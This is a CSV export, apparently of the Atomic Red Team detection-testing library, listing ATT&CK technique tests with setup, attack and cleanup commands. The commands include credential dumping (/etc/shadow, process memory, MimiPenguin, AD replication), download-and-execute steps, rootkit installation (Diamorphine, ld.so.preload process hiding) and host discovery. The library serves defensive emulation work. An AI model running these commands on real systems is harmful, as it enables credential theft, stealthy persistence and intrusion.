"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1003.006","Run DSInternals Get-ADReplAccount","Get-ADReplAccount -All -Server #{logonserver}
","Install-Module -Name DSInternals -Scope CurrentUser -Force
","","C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml"
"T1003.007","Dump individual process memory with sh (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""
","echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}
","rm -f ""#{output_file}""
","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml"
"T1003.007","Dump individual process memory with sh on FreeBSD (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
MEM_START=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f1)
MEM_STOP=$(head -n 5 /proc/""${PID}""/map | tail -1 | cut -d' ' -f2)
MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
strings ""#{output_file}"" | grep -i PASS
","echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}
","rm -f ""#{output_file}""
","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml"
"T1003.007","Dump individual process memory with Python (Local)","sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
PYTHON=$(which python || which python3 || which python2)
$PYTHON #{python_script} $PID #{output_file}
grep -i ""PASS"" ""#{output_file}""
","echo '#!/bin/sh' > #{script_path}
echo ""sh -c 'echo \""The password is #{pid_term}\"" && sleep 30' &"" >> #{script_path}

---
echo ""Python 2.7+ or 3.4+ must be installed""
","rm -f ""#{output_file}""
","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml"
"T1003.007","Capture Passwords with MimiPenguin","sudo #{MimiPenguin_Location} > #{output_file}
cat #{output_file}
","wget -O ""/tmp/mimipenguin.tar.gz"" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
mkdir /tmp/mimipenguin
tar -xzvf ""/tmp/mimipenguin.tar.gz"" -C /tmp/mimipenguin

---
sudo apt-get -y install binutils

---
sudo apt-get -y install python2       

---
sudo apt-get -y install libc-bin        
","rm -f #{output_file} > /dev/null
","C:\AtomicRedTeam\atomics\T1003.007\T1003.007.yaml"
"T1003.008","Access /etc/shadow (Local)","sudo cat /etc/shadow > #{output_file}
cat #{output_file}
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml"
"T1003.008","Access /etc/master.passwd (Local)","sudo cat /etc/master.passwd > #{output_file}
cat #{output_file}
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml"
"T1003.008","Access /etc/passwd (Local)","cat /etc/passwd > #{output_file}
cat #{output_file}
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml"
"T1003.008","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat","unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml"
"T1003.008","Access /etc/{shadow,passwd,master.passwd} with shell builtins","testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
","","rm -f #{output_file}
","C:\AtomicRedTeam\atomics\T1003.008\T1003.008.yaml"
"T1005","Search files of interest and save them to a single zip file (Windows)","$startingDirectory = ""#{starting_directory}""
$outputZip = ""#{output_zip_folder_path}""
$fileExtensionsString = ""#{file_extensions}"" 
$fileExtensions = $fileExtensionsString -split "", ""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""

  Write-Host ""Zip file created: $outputZip\data.zip""
  } else {
      Write-Host ""No files found with the specified extensions.""
  }
","","Remove-Item -Path  $outputZip\data.zip -Force
","C:\AtomicRedTeam\atomics\T1005\T1005.yaml"
"T1005","Find and dump sqlite databases (Linux)","cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""SQLite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;
","if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
","rm -f $HOME/.art
rm -f $HOME/gta.db
rm -f $HOME/sqlite_dump.sh 
","C:\AtomicRedTeam\atomics\T1005\T1005.yaml"
"T1005","Copy Apple Notes database files using AppleScript","osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""#{destination_path}""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'","","rm ""#{destination_path}/NoteStore.sqlite*""","C:\AtomicRedTeam\atomics\T1005\T1005.yaml"
"T1006","Read volume boot sector via DOS device path (PowerShell)","$buffer = New-Object byte[] 11
$handle = New-Object IO.FileStream ""\\.\#{volume}"", 'Open', 'Read', 'ReadWrite'
$handle.Read($buffer, 0, $buffer.Length)
$handle.Close()
Format-Hex -InputObject $buffer
","","","C:\AtomicRedTeam\atomics\T1006\T1006.yaml"
"T1007","System Service Discovery","tasklist.exe /svc
sc query
sc query state= all
","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - net.exe","net.exe start >> #{output_file}
","","del /f /q /s #{output_file} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - systemctl/service","if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","Get-Service Execution","powershell.exe Get-Service","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - macOS launchctl","launchctl list","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - Windows Scheduled Tasks (schtasks)","schtasks /query /fo LIST /v","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - Services Registry Enumeration","Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services' |
  ForEach-Object {
    $p = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue
    [PSCustomObject]@{
      Name        = $_.PSChildName
      DisplayName = $p.DisplayName
      ImagePath   = $p.ImagePath
      StartType   = $p.Start
    }
  }
","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1007","System Service Discovery - Linux init scripts","echo ""[*] Listing SysV init scripts (/etc/init.d):""
if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi
echo
echo ""[*] Listing runlevel directories (/etc/rc*.d):""
ls -ld /etc/rc*.d 2>/dev/null || echo ""No /etc/rc*.d directories found""
","","","C:\AtomicRedTeam\atomics\T1007\T1007.yaml"
"T1010","List Process Main Windows - C# .NET","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}""
#{output_file_name}
","New-Item -Type Directory (split-path ""#{input_source_code}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile ""#{input_source_code}""
","del /f /q /s #{output_file_name} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1010\T1010.yaml"
"T1012","Query Registry","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""
reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""
","","","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1012","Query Registry with Powershell cmdlets","Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" | findstr Windows
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""
Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
Get-Item -Path ""HKCU:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
Get-ChildItem -Path ""HKLM:system\currentcontrolset\services"" 
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""
","","","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1012","Enumerate COM Objects in Registry with Powershell","New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")
{try{write-output ""$($Position)-$($CLSID)""
write-output ""------------""| out-file #{output_file} -append
write-output $($CLSID)| out-file #{output_file} -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
$position += 1} catch{}}
","","remove-item #{output_file} -force -erroraction silentlycontinue
remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue      
","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1012","Reg query for AlwaysInstallElevated status","reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated      
","","","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1012","Check Software Inventory Logging (SIL) status via Registry","reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
","","","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1012","Inspect SystemStartOptions Value in Registry","reg.exe query HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions
","","","C:\AtomicRedTeam\atomics\T1012\T1012.yaml"
"T1014","Loadable Kernel Module based Rootkit","sudo insmod #{rootkit_path}/#{rootkit_name}.ko
","sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;
cp #{rootkit_source_path}/* /tmp/T1014/
cd /tmp/T1014; make
mkdir #{rootkit_path}
mv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko
rm -rf /tmp/T1014
","sudo rmmod #{rootkit_name}
sudo rm -rf #{rootkit_path}
","C:\AtomicRedTeam\atomics\T1014\T1014.yaml"
"T1014","Loadable Kernel Module based Rootkit","sudo modprobe #{rootkit_name}
","sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
cp #{rootkit_source_path}/* /tmp/T1014
cd /tmp/T1014; make        
sudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/
[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
sudo depmod -a
","sudo modprobe -r #{rootkit_name}
sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko
sudo depmod -a
","C:\AtomicRedTeam\atomics\T1014\T1014.yaml"
"T1014","dynamic-linker based rootkit (libprocesshider)","echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""
","mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
make
cp libprocesshider.so #{library_path}
cp /usr/bin/ping /usr/local/bin/evil_script.py
","sed -i ""\:^#{library_path}:d"" /etc/ld.so.preload
rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
","C:\AtomicRedTeam\atomics\T1014\T1014.yaml"
"T1014","Loadable Kernel Module based Rootkit (Diamorphine)","sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID=""$!""
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo ""process ${TARGETPID} hidden""
","mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
make
sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
sudo depmod -a
","kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a
","C:\AtomicRedTeam\atomics\T1014\T1014.yaml"
"T1016","System Network Configuration Discovery on Windows","ipconfig /all
netsh interface show interface
arp -a
nbtstat -n
net config
","","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","List Windows Firewall Rules","netsh advfirewall firewall show rule name=all
","","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","System Network Configuration Discovery","if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""netstat -Sp tcp""; else cmd=""netstat -ant""; fi;
if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi;
if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;
","(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)
","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","System Network Configuration Discovery (TrickBot Style)","ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
","","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","List Open Egress Ports","$ports = Get-content ""#{port_file}""
$file = ""#{output_file}""
$totalopen = 0
$totalports = 0
New-Item $file -Force
foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect(""allports.exposed"", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = ""$port open"" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = ""$port closed"" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = ""There were a total of $totalopen open ports out of $totalports ports tested.""
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
","New-Item -Type Directory (split-path ""#{port_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""#{portfile_url}"" -OutFile ""#{port_file}""
","Remove-Item -ErrorAction ignore ""#{output_file}""
","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","Adfind - Enumerate Active Directory Subnet Objects","""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) #{optional_args}
","New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
"T1016","Qakbot Recon","""#{recon_commands}""
","New-Item -Type Directory (split-path ""#{recon_commands}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/qakbot.bat"" -OutFile ""#{recon_commands}""
","","C:\AtomicRedTeam\atomics\T1016\T1016.yaml"
